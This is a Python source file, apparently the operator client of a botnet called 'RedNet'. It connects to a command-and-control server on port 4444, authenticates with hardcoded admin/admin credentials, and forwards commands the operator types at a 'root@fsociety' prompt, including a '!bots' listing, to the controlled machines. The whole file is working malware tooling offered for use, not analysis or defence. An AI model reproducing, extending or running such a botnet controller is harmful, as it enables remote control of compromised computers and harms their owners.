import socket,argparse,platform
from sys import exit

if platform.system() == 'Linux': # Set colors to terminal
        red = '\033[31m'
        default_color = '\033[0;0m'
        blue = '\033[34m'
        os = 'Linux'
else:
    os = 'Windows'

BUFFER_SIZE     = 1024

user     = 'admin'
password = 'admin'

parser = argparse.ArgumentParser(description='RedNet - Botnet developed by Reddy')
parser.add_argument('--host', type=str, help='IP of server')
parser.add_argument('--port','-p', type=int, help='PORT of server', default=4444)
args = parser.parse_args()
if not args.host:
        parser.print_help()
        exit(0)
        
root_socket     = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
root_socket.connect((args.host,args.port))
root_socket.send('admin')

def starting():
    print """
$$\   $$\                                                                       
$$$\  $$ |                                                                      
$$$$\ $$ |       $$$$$$\         $$$$$$\        $$\   $$\       $$\   $$\       
$$ $$\$$ |       \____$$\       $$  __$$\       \$$\ $$  |      $$ |  $$ |      
$$ \$$$$ |       $$$$$$$ |      $$ /  $$ |       \$$$$  /       $$ |  $$ |      
$$ |\$$$ |      $$  __$$ |      $$ |  $$ |       $$  $$<        $$ |  $$ |      
$$ | \$$ |      \$$$$$$$ |      \$$$$$$  |      $$  /\$$\       \$$$$$$$ |      
\__|  \__|       \_______|       \______/       \__/  \__|       \____$$ |      
                                                                $$\   $$ |      
                                                                \$$$$$$  |      
                                                                 \______/       
$$$$$$$\             $$\                          $$\                           
$$  __$$\            $$ |                         $$ |                          
$$ |  $$ | $$$$$$\ $$$$$$\   $$$$$$$\   $$$$$$\ $$$$$$\                         
$$$$$$$\ |$$  __$$\\_$$  _|  $$  __$$\ $$  __$$\\_$$  _|                        
$$  __$$\ $$ /  $$ | $$ |    $$ |  $$ |$$$$$$$$ | $$ |                          
$$ |  $$ |$$ |  $$ | $$ |$$\ $$ |  $$ |$$   ____| $$ |$$\                       
$$$$$$$  |\$$$$$$  | \$$$$  |$$ |  $$ |\$$$$$$$\  \$$$$  |                      
\_______/  \______/   \____/ \__|  \__| \_______|  \____/                       
                                                                                
                                                                                
                                                                               
"""

def captureCommand():
    while True:
        try:
            if os == 'Linux':
                command = raw_input(red+'root@fsociety'+default_color+':'+blue+'~'+default_color+'# ')
            else:
                command = raw_input('root@fsociety:~# ')
            if not command:
                continue   
            elif '!exit' in command:
                raise SyntaxError
            elif '!bots' in command:
                sendCommands(addCredentials(command))
                print root_socket.recv(BUFFER_SIZE)
            else: 
                sendCommands(addCredentials(command))
        except SyntaxError:
            exit(0)
        except Exception:
            continue

def addCredentials(command):
    command  = user+'-'+password+'#'+command
    return command

def sendCommands(command):
    root_socket.send(command)

if __name__ == '__main__':
    starting()
    captureCommand()
